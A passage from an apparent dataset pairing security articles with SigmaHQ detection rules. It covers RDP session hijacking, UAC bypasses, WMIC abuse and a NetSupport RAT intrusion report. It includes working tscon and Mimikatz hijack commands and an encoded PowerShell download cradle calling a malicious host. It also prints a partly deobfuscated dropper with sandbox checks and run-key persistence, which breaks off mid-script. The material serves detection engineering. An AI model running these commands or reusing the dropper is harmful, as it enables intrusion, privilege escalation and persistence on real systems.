hijacking.\n- Limit user permissions for RDP access.\n- Regularly audit remote desktop users.\n- Monitor `tscon.exe`.\n- Keep an eye on services using `cmd.exe /k` or `cmd.exe /c` parameters related to RDP.\n\n### Conditions for the practical\n\n- You must have Full Control access permission or Connect special access permission to connect to another session.\n- The `/dest:<SessionName>` parameter allows you to connect the session of another user to a different session.\n- If you do not specify a password in the `<Password>` parameter, and the target session belongs to a user other than the current one, `tscon` fails.\n- You cannot connect to the console session.\n\n### TL; DR\n\nAttackers can connect to various systems/users in the network using RDP. This technique is known as Remote Desktop Session Hijacking. Tools like Mimikatz allow us to hijack such RDP sessions without knowing the credentials. This hijacking can be done both remotely and locally for both active and disconnected sessions.\n\nLocally, it can be done using the following commands:\n\n```\nquery user\nsc create hijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#1\"\nnet start hijack\n```\n\nWhen using Mimikatz, use the following commands:\n\n```\nprivilege::debug\ntoken::elevate\nts::remote /id:1\n```\n\n### Conclusion\n\nRDP session hijacking has been used in large-scale attacks. Many C2 servers such as Cobalt Strike and Kodiac allow us to initiate RDP connections, which further leads to lateral movement such as RDP session hijacking. Attackers have used this technique in multiple high-level attacks, including those by the Lazarus Group, WannaCry, Leviathan, and FIN8. It is important to be familiar with such methods and techniques to protect oneself, as it is a liability that works in favor of attackers. This technique is popular because it does not generate proper event logs, allowing attackers to cover their tracks.\n\n### Reference\n\n- MITRE ATT&CK\n- 0-day or Feature Privilege Escalation",
    "sigma_rule": {
      "title": "Suspicious RDP Redirect Using TSCON",
      "id": "f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb",
      "status": "test",
      "description": "Detects a suspicious RDP session redirect using tscon.exe",
      "references": [
        "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-03-17",
      "modified": "2023-05-16",
      "tags": [
        "attack.lateral-movement",
        "attack.t1563.002",
        "attack.t1021.001",
        "car.2013-07-002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": " /dest:rdp-tcp#"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tscon_rdp_redirect.yml",
    "id": "611"
  },
  {
    "url": "https://github.com/netero1010/TrustedPath-UACBypass-BOF",
    "markdown": "# BOF - Trusted Path UAC Bypass\n\nBeacon object file implementation for trusted path UAC bypass. The target executable will be called without involving \"cmd.exe\" by using DCOM object.\n\n## Technical details:\n\nhttps://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows\n\n## Usage\n\n```\nExample: bof-trustedpath-uacbypass ComputerDefaults.exe /root/edputil.dll\n```\n\n## Compile\n\n```\nmake\n```\n\n## Execution\n\n```\nbeacon> help bof-trustedpath-uacbypass\nVersion: 1.0\nAuthor: Chris Au\nTwitter: @netero_1010\nGithub: @netero1010\n\n====================Trusted Path UAC Bypass BOF Workflow=======================\nStep 1: Upload the DLL payload to \"C:\\Windows\\Tasks\"\nStep 2: Create a new folder called \"C:\\Windows \\System32\"\nStep 3: Copy desired executable to \"C:\\Windows \\System32\"\nStep 4: Copy the DLL payload to \"C:\\Windows \\System32\"\nStep 5: Use DCOM to execute \"C:\\Windows \\System32\\<desired executable>\"\nStep 6: Delete the DLL payload on \"C:\\Windows\\Tasks\"\n================================================================================\n\nExample: bof-trustedpath-uacbypass ComputerDefaults.exe /root/edputil.dll\n```\n\n```image\nAlt: HowTo\nDescription: The image displays terminal output from a command-line interface (CLI) demonstrating the execution of a 'Trusted Path UAC Bypass' technique. It shows a series of operations where a DLL payload is dropped into the 'C:\\Windows\\Tasks' folder, an executable is copied to 'C:\\Windows\\System32', and then executed. The output includes success messages for each step, confirming that files were copied and executed successfully, as well as the deletion of the DLL payload after execution.\nTranscription: |\n  beacon> bof-trustedpath-uacbypass ComputerDefaults.exe /root/Desktop/edputil.dll\n  [+] Dropped DLL payload to \"C:\\Windows\\Tasks\" folder.\n  [+] host called home, sent: 410696 bytes\n  [+] received output:\n  Copying file from \"C:\\Windows\\System32\\ComputerDefaults.exe\" to \"C:\\Windows\\System32\\ComputerDefaults.exe\".\n  [+] received output:\n  Executable copied successfully.\n  [+] received output:\n  DLL payload copied successfully.\n  [+] received output:\n  [+] received output:\n  Executing \"C:\\Windows\\System32\\ComputerDefaults.exe\"...\n  [+] received output:\n  Cleaning up...\n  [+] received output:\n  DLL payload in the \"C:\\Windows\\Tasks\" deleted successfully.\n```\n\n## Credit\n\nexcellent research\nhttps://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e\nhttps://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows\n\nawesome DCOM BOF implementation\nhttps://github.com/Yaxser/CobaltStrike-BOF/tree/master/DCOM%20Lateral%20Movement",
    "sigma_rule": {
      "title": "TrustedPath UAC Bypass Pattern",
      "id": "4ac47ed3-44c2-4b1f-9d51-bf46e8914126",
      "status": "test",
      "description": "Detects indicators of a UAC bypass method by mocking directories",
      "references": [
        "https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e",
        "https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows",
        "https://github.com/netero1010/TrustedPath-UACBypass-BOF"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-08-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|contains": "C:\\Windows \\System32\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_trustedpath.yml",
    "id": "617"
  },
  {
    "url": "https://web.archive.org/web/20200530031302/https://twitter.com/ReaQta/status/1222548288731217921",
    "markdown": "# Post\n\nJan 29, 2020\n\n#Trickbot ITW is now using a brand new #UACBypass for Windows 10 machines: wsreset.exe uac bypass. #Emotet\nMore info here:\n\nhttps://lolbas-project.github.io/lolbas/Binaries/Wsreset/\nhttps://www.activecyber.us/activelabs/windows-uac-bypass",
    "sigma_rule": {
      "title": "Bypass UAC via WSReset.exe",
      "id": "d797268e-28a9-49a7-b9a8-2f5039011c5c",
      "related": [
        {
          "id": "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.",
      "references": [
        "https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://web.archive.org/web/20240417002556/https://www.activecyber.us/activelabs/windows-uac-bypass",
        "https://web.archive.org/web/20200530031302/https://twitter.com/ReaQta/status/1222548288731217921"
      ],
      "author": "E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth",
      "date": "2019-10-24",
      "modified": "2022-05-13",
      "tags": [
        "attack.privilege-escalation",
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wsreset.exe"
        },
        "filter": [
          {
            "Image|endswith": "\\conhost.exe"
          },
          {
            "OriginalFileName": "CONHOST.EXE"
          }
        ],
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown sub processes of Wsreset.exe"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset.yml",
    "id": "621"
  },
  {
    "url": "https://www.echotrail.io/insights/search/wermgr.exe",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Child Process Of Wermgr.EXE",
      "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
      "related": [
        {
          "id": "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) child process",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
        "https://www.echotrail.io/insights/search/wermgr.exe",
        "https://github.com/binderlabs/DirCreate2System"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-10-14",
      "modified": "2024-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1055",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wermgr.exe",
          "Image|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\ipconfig.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\netstat.exe",
            "\\nslookup.exe",
            "\\powershell_ise.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\systeminfo.exe",
            "\\whoami.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_rundll32": {
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "C:\\Windows\\system32\\WerConCpl.dll",
            "LaunchErcApp "
          ],
          "CommandLine|contains": [
            "-queuereporting",
            "-responsepester"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wermgr_susp_child_process.yml",
    "id": "646"
  },
  {
    "url": "https://www.echotrail.io/insights/search/wermgr.exe",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Execution Location Of Wermgr.EXE",
      "id": "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
      "related": [
        {
          "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location.",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
        "https://www.echotrail.io/insights/search/wermgr.exe",
        "https://github.com/binderlabs/DirCreate2System"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-10-14",
      "modified": "2023-08-23",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wermgr.exe"
        },
        "filter_main_legit_location": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wermgr_susp_exec_location.yml",
    "id": "649"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Scripts/Winrm/",
    "markdown": "",
    "sigma_rule": {
      "title": "Remote Code Execute via Winrm.vbs",
      "id": "9df0dd3a-1a5c-47e3-a2bc-30ed177646a0",
      "status": "test",
      "description": "Detects an attempt to execute code or create service on remote host via winrm.vbs.",
      "references": [
        "https://twitter.com/bohops/status/994405551751815170",
        "https://redcanary.com/blog/lateral-movement-winrm-wmi/",
        "https://lolbas-project.github.io/lolbas/Scripts/Winrm/"
      ],
      "author": "Julia Fomina, oscd.community",
      "date": "2020-10-07",
      "modified": "2023-03-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cscript.exe"
          },
          {
            "OriginalFileName": "cscript.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "winrm",
            "invoke Create wmicimv2/Win32_",
            "-r:http"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml",
    "id": "659"
  },
  {
    "url": "https://twitter.com/mattifestation/status/986280382042595328",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential SquiblyTwo Technique Execution",
      "id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
      "status": "test",
      "description": "Detects potential SquiblyTwo attack technique with possible renamed WMIC via Imphash and OriginalFileName fields",
      "references": [
        "https://web.archive.org/web/20190209154607/https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html",
        "https://twitter.com/mattifestation/status/986280382042595328",
        "https://atomicredteam.io/defense-evasion/T1220/",
        "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
      ],
      "author": "Markus Neis, Florian Roth",
      "date": "2019-01-16",
      "modified": "2024-11-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1220",
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_pe": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Hashes|contains": [
              "IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E",
              "IMPHASH=37777A96245A3C74EB217308F3546F4C",
              "IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "format:",
            "http"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_squiblytwo_bypass.yml",
    "id": "675"
  },
  {
    "url": "https://thedfirreport.com/2020/10/08/ryuks-return/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Process Created Via Wmic.EXE",
      "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
      "related": [
        {
          "id": "526be59f-a573-4eea-b5f7-f0973207634d",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.",
      "references": [
        "https://thedfirreport.com/2020/10/08/ryuks-return/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-10-12",
      "modified": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "process ",
            "call ",
            "create "
          ],
          "CommandLine|contains": [
            "rundll32",
            "bitsadmin",
            "regsvr32",
            "cmd.exe /c ",
            "cmd.exe /k ",
            "cmd.exe /r ",
            "cmd /c ",
            "cmd /k ",
            "cmd /r ",
            "powershell",
            "pwsh",
            "certutil",
            "cscript",
            "wscript",
            "mshta",
            "\\Users\\Public\\",
            "\\Windows\\Temp\\",
            "\\AppData\\Local\\",
            "%temp%",
            "%tmp%",
            "%ProgramData%",
            "%appdata%",
            "%comspec%",
            "%localappdata%"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_susp_process_creation.yml",
    "id": "680"
  },
  {
    "url": "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
    "markdown": "# NetSupport Intrusion Results in Domain Compromise\n\n**Category:** netsupport\n**Published on:** October 30, 2023\n\nNetSupport Manager is one of the oldest third-party remote access tools still currently on the market with over 33 years of history. This is the first time we will report on a NetSupport RAT intrusion, but malicious use of this tool dates back to at least 2016. During this report, we will analyze a case from January 2023 where a NetSupport RAT was utilized to infiltrate a network. The RAT was then used for persistence and command & control, resulting in a full domain compromise.\n\n## Case Summary\n\nThis intrusion began with an email delivered with a zip file containing a malicious Javascript file. Following email delivery, a user extracted and executed the Javascript file. The JavaScript code pulled down an obfuscated PowerShell script that was run in memory. The PowerShell script was responsible for deploying NetSupport onto the system along with ensuring the script was not running in a sandbox and establishing persistence using registry run keys.\n\nFive days after the deployment of NetSupport, the threat actor conducted preliminary reconnaissance by using various Windows utilities like whoami, net, and systeminfo. The threat actor then tried to re-enable a domain admin account that was disabled but appeared to have not succeeded.\n\nThis activity was followed several hours later by the installation of an OpenSSH server on the beachhead to facilitate persistence to the machine and network. In order to connect to the OpenSSH server the threat actors established a reverse SSH tunnel from the beachhead to their own server hosted on a VPS provider.\n\nUsing the previously mentioned reverse SSH tunnel to proxy connections through the beachhead host, the threat actors created a connection to the domain controller. Through the SSH tunnel the threat actors made use of Impacket's atexec.py to issue various discovery commands looking for privileged groups and domain joined computers.\n\nEight hours later, the threat actor changed firewall settings on a remote server and then began using Impacket's wmiexec.py to engage in further lateral movement. The threat actor moved cab files to the remote hosts using SMB and then expanded and ran them using wmiexec.py commands. The executed files were also NetSupport malware, however, these were configured to talk to a new command and control server. Once running, the threat actor then setup a scheduled task for persistence on these remote hosts. A few additional discovery commands were then issued on remote hosts before activity ceased.\n\nThe threat actors returned the next day deploying NetSupport on a domain controller. With this access they proceeded to dump the NTDS.dit database. After dumping it, they used 7-zip to compress the files. No specific exfiltration was observed but we assess with medium confidence that this archive was exfiltrated over the network via one of the existing command and control channels.\n\nA little less than an hour later, the threat actor moved to another domain controller and proceeded to again dump NTDS.dit. They also dropped and ran Pingcastle, an active directory auditing tool. While this was running, they used NetSupport to access a backup server to create a new account and add it to the local Administrators and Remote Desktop groups. Using that account, they logged in using RDP, proxying the connection from the beachhead host.\n\nAfter logging in, they dropped Netscan and a keygen. The threat actor checked on the status of Microsoft Defender and then proceeded to disable it. After disabling the protections, they dropped a renamed ProcDump binary and proceeded to dump LSASS on the domain controller, as well as a backup server.\n\nAfter this, the threat actor then issued a PowerShell command to search and dump Windows event ID 4624 logon events from the host. These were then zipped using 7-zip and then likely exfiltrated over existing command and control channels for further review. The threat actor also browsed file shares from the domain controller, opening several sensitive documents. Netscan was then moved to the domain controller and executed there. The threat actor issued a few more discovery commands using WMI, and then performed some clean up by killing running tasks like Netscan and the ssh proxy.\n\nThe final actions observed involved the threat actor dropping two Nim binaries on a domain controller. These Nim binaries were then used to attempt to create a backdoor user and elevate them to admin level permissions. We did not observe any backdoor account created after execution. After our own testing, we saw the tool failed to work and would return an error. After this, no further hands on activity was seen from the threat actor before they were evicted from the network.\n\n## Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, Havoc, etc. More information on this service can be found here.\n\nOur All Intel service includes private reports, exploit events, long term infrastructure tracking, clustering, C2 configs, and other curated intel, including non-public case data.\n\nIf you are interested in hearing more about our services or would like to talk about a free trial, please reach out using the Contact Us page. We look forward to hearing from you.\n\nInterested in a DFIR Report sticker, shirt, mug or other merchandise? Check out our shop.\n\n## Initial Access\n\nInitial Access began with a ZIP file delivered to a victim through email. This email campaign was observed in the wild occurring between late December 2022 through mid January 2023 according to Brad/@malware_traffic. An earlier sample was documented here using a USPS delivery theme with some overlap in command and control present between the intrusions. Once the ZIP file is extracted the user is presented with a JavaScript file.\n\n```image\nAlt: JavaScript File\nDescription: The image depicts an email client interface (Mozilla Thunderbird) showing an email titled 'Confirm Forest City account status' from a user named Gloria Z. Drewes. The email contains a message prompting the recipient to download an attached ZIP file named '98181772.zip'. Below the email, there is a window displaying the contents of the ZIP file, which includes a JavaScript file named '2326.js'. The visual elements highlight the process of initial access in a cyber intrusion scenario, illustrating the method of delivering malicious content via email.\nTranscription: |\n  From: Gloria Z. Drewes <no-reply@astragale-bien-etre.info>\n  Subject: Confirm Forest City account status\n  Date: Wed, 18 Jan 2023 21:56:25 +0300\n  \n  Dear Customer,\n  \n  I have sent you the documents regarding your account status, please download file.\n  \n  Best regards,\n  \n  Gloria Z. Drewes\n  2705 Woodrow Way, Livingston, TX, 77351\n  Phone: +1-(946)-895-5149\n  Fax: +1-(885)-526-4370\n  -----------------------------------------------\n  Distributor for USA: Forest City\n  VAT Reg. USA 489665771\n  \n  Attachment: 98181772.zip (7.8 KB)\n```\n\nOnce the user clicks on the JavaScript file, WScript will invoke the script.\n\n```image\nAlt: WScript Invocation\nDescription: The image displays a command line output showing the execution of a JavaScript file using WScript on a Windows system. It specifically shows the path to the WScript executable along with the path to the JavaScript file located in the Downloads directory. This detail is relevant as it highlights the method of execution in the context of a cyber intrusion scenario.\nTranscription: |\n  process.command_line\n  \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\XXXXXX\\Downloads\\2326.js\"\n```\n\n## Execution\n\n### NetSupport Deployment\n\nWScript was used to execute `2326.js` after the user ran the file from the zipped archive.\n\n```image\nAlt: WScript Execution\nDescription: The image is a screenshot displaying a table of events related to a security incident. It contains columns labeled 'event.provider', 'event.code', 'process.parent.command_line', and 'process.command_line'. Each row details the execution of commands, showing the processes involved, specifically 'WScript.exe' and 'cmd.exe', along with the corresponding command lines used to execute the scripts related to the NetSupport intrusion.\nTranscription: |\n  event.provider           event.code   process.parent.command_line                                      process.command_line\n  Microsoft-Windows-Sysmon 1            C:\\Windows\\Explorer.EXE                                       \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\****\\Downloads\\2326.js\"\n  Microsoft-Windows-Sysmon 1            C:\\Windows\\System32\\cmd.exe /c Powershell -nop -w hidden -ep bypaSS -enC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQBvAHQAYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZABlAHgALgBwAGgAcAAiACkA\n```\n\nFollowing initial execution, `2326.js` invokes an encoded PowerShell command that reaches out to a hard-coded domain, `hxxp://1otal.com/index/index.php`, downloading and invoking the contents as PowerShell code.\n\n```\n\"C:\\Windows\\System32\\cmd.exe\" /c PowersheLl -nop -w hidden -ep bypaSS -enC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQBvAHQAYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZABlAHgALgBwAGgAcAAiACkA\n```\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a snippet of PowerShell code that suggests the use of Base64 decoding. The code shows a command for downloading a string from a specified URL, which is part of a malicious payload related to the NetSupport intrusion. The image highlights the phrase 'Base64 Decoded' in a red box, emphasizing the significance of decoding in the context of the malicious script.\nTranscription: |\n  SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQBvAHQAYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZABlAHgALgBwAGgAcAAiACkA\n```\n\nThe contents downloaded from `hxxp://1otal.com/index/index.php` take the form of an obfuscated PowerShell script responsible for the initial deployment of NetSupport. The full obfuscated contents of this script can be found on this link.\n\n```image\nAlt: Obfuscated Script\nDescription: The image displays a detailed HTTP request and response log for a GET request to '1otal.com'. It includes the method, status code (200 OK), headers (such as content type and server details), and a unique Body MD5 hash. Additionally, a snippet of obfuscated PowerShell code is shown, indicating the nature of the response. The layout is structured to provide clear visibility of the HTTP transaction details, making it informative for understanding the interaction with the malicious domain.\nTranscription: |\n  HTTP\n    Method: GET\n    Status code: 200\n    Hosts: 1otal.com\n    Request Headers: connection\n    Client Versions: 1.1\n    Response Headers: connection, content-type, date, server, transfer-encoding\n    Server Versions: 1.1\n    Body MD5s: ea36e629cf6c4c635de3d5df1ef653\n    libfile content type: text/plain\n    content-type Header: text/html; charset=UTF-8\n    server Header: nginx/1.22.0\n  \n  GET /index/index.php HTTP/1.1\n  Host: 1otal.com\n  Connection: Keep-Alive\n  \n  HTTP/1.1 200 OK\n  Server: nginx/1.22.0\n  Date:\n  Content-Type: text/html; charset=UTF-8\n  Transfer-Encoding: chunked\n  Connection: keep-alive\n  Vary: Accept-Encoding\n  \n  1F56\n    ${'4'+'g0o'} = [tYpE](\"{$3}{$0}{$4}{$7}{$9}{$5}{$2}{$1}{6}\" -f '.', 'resS', '.c', 'SysTEm.io', 'CoMp', 'On', 'f'+'ile', 'tE', 'Sys', 'M.IO.') ; ${'s`cr'`iptA`th'} = &(\"${0}{2}{1}\" -f 'spl', 'th', 'it-pa') -parent ${'4'+'g0o'}\n   \n  if (${'Sc`Rip`'path'} -match (\"{@{0}{1}\" -f 'a', 'v')) {exit}\n  if (${'s`cr'`ipT`path'} -match \"avg\") {exit}\n  if (${'Scr`ip'TpATH'} -match (\"{@{0}{1}\" -f 'sample')) {exit}\n  if (${'$SCRI`p`TaPTH'} -match (\"{@{0}{1}\" -f 'analy', 'sis')) {exit}\n  if (${'scri`pt`p'Ath'} -match (\"{@{0}{1}{2}\" -f 'm', 'al', 'wa')) {exit}\n  if (${'s`cr'`ipT`paH'} -match (\"{@{0}{1}\" -f 'dbox', 'san')) {exit}\n  if (${'sc`RiPtPa`TH'} -match (\"{@{1}{0}\" -f 'ir', 'v')) {exit}\n```\n\nThe following is the deobfuscated NetSupport deployment script. Note, this script has been cleaned up for brevity.\n\n```\n# Get Script Filename\n${ScriptPath} = Split-Path -parent ${MyInvocation}.MyCommand.Definition\n\n# Check Script Filename Agianst a Blacklist\nif (${ScriptPath} -match \"avast\") {exit}\nif (${ScriptPath} -match \"avg\")      {exit}\nif (${ScriptPath} -match \"sample\")   {exit}\nif (${ScriptPath} -match \"analysis\") {exit}\nif (${ScriptPath} -match \"malware\")  {exit}\nif (${ScriptPath} -match \"sandbox\")  {exit}\nif (${ScriptPath} -match \"virus\")    {exit}\n\n# Wrapper Function around Convert-StringToBinary\nfunction React (${Source}, ${Destination})\n{\n    Convert-StringToBinary -InputString ${Source} -FilePath ${Destination};\n}\n\n# Write a Base64 Encoded String to Disk\nfunction Convert-StringToBinary (${InputString}, ${FilePath})\n{\n    ${file}= ${InputString}\n\n    ${Data} =  [System.Convert]::FromBase64String(${file})\n    ${MemoryStream} = New-Object \"System.IO.MemoryStream\"\n    ${MemoryStream}.Write(${Data}, 0, ${Data}.\"Length\")\n    ${MemoryStream}.Seek(0,0) | Out-Null\n\n    ${DecompressedStream} = New-Object System.IO.Compression.GZipStream(${MemoryStream}, [System.IO.Compression.CompressionMode]::Decompress)\n    ${StreamReader} = New-Object System.IO.StreamReader(${DecompressedStream})\n    ${t} = ${StreamReader}.ReadToEnd()\n\n    ${ByteArray} =  [System.Convert]::FromBase64String(${t});\n    [System.IO.File]::WriteAllBytes(${FilePath}, ${ByteArray});\n}\n\n# The Install Function is invoked at the end of the script and will have the main execution logic.\nfunction Install\n{\n    # Registry Path Variables for Persistence, these are written to towards the end of the script.\n    [string] ${reg_key} = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n    [string] ${reg_name} = \"SoftwareUpdater\"\n\n    # Embedded File Variables\n    ${File1} = Gzip Compressed and Base64 Encoded presentationhost.exe\n    ${File2} = Gzip Compressed and Base64 Encoded client32.ini # NetSupport client configuration\n    ${File3} = Gzip Compressed and Base64 Encoded HTCTL32.DLL # Dependency DLL\n    ${File4} = Gzip Compressed and Base64 Encoded msvcr100.dll # Dependency DLL\n    ${File5} = Gzip Compressed and Base64 Encoded nskbfltr.inf # NetSupport component file\n    ${File6} = Gzip Compressed and Base64 Encoded NSM.ini # NetSupport component file which tells the installer which components to install\n    ${File7} = Gzip Compressed and Base64 Encoded NSM.lic # NetSupport license information file\n    ${File8} = Gzip Compressed and Base64 Encoded pcicapi.dll # Dependency DLL\n    ${File9} = Gzip Compressed and Base64 Encoded PCICHEK.DLL # Dependency DLL\n    ${File10} = Gzip Compressed and Base64 Encoded PCICL32.DLL # Dependency DLL\n    ${File11} = Gzip Compressed and Base64 Encoded remcmdstub.exe\n    ${File12} = Gzip Compressed and Base64 Encoded TCCTL32.DLL # Dependency DLL\n\n    # Generate Random Folder Name with 8 alphanumeric characters\n    ${RandF}=( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 8 | &amp;('%') {[char]${_}}) )\n    ${FPath} =\"$env:appdata\\$Randf\"\n    mkdir ${FPath}\n\n    [string] ${ClientName} = \"presentationhost.exe\"\n    [string] ${remcmdstub} = \"remcmdstub.exe\"\n\n    React -source ${File1} -destination \"$FPath\\\"+\"$ClientName\"\n    React -source ${File2} 